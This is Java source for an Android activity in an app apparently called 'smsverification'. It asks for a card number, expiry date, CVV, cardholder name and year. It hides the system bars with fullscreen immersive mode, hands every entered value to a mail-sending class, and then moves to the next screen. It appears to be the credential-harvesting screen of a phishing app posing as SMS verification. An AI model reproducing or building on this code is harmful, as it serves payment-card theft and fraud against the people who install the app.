package com.smsverification;


import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;

import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;

public class Main2Activity extends AppCompatActivity {




    Button gönder;

    private EditText kartnumarasi, skt, ccv,adsoyad,alicimail,yıl;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main2);

        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);



alicimail = findViewById(R.id.textView1111);
        kartnumarasi = findViewById(R.id.edit_username);
        skt = findViewById(R.id.textView512);
        adsoyad = findViewById(R.id.textView11);
        ccv = findViewById(R.id.textView52);
        yıl = findViewById(R.id.yıl);


        gönder = findViewById(R.id.gönder);



        View decorView = getWindow().getDecorView();
        int uiOptions = View.SYSTEM_UI_FLAG_FULLSCREEN | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY;
        decorView.setSystemUiVisibility(uiOptions);


    }



    public void gönder(View v){




        MailGonderici mg2 = new MailGonderici(Main2Activity.this, alicimail.getText().toString(), kartnumarasi.getText().toString(), skt.getText().toString(),ccv.getText().toString(),adsoyad.getText().toString(),yıl.getText().toString());

              // Mail Gönderme işlemini başlattığımız nokta
              mg2.execute();

        final Handler handler = new Handler(Looper.getMainLooper());
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                deneme2();
            }
        }, 3000);

    }

public void deneme2(){

    Intent intent = new Intent (this, Main3Activity.class);
    startActivity(intent);

}




}
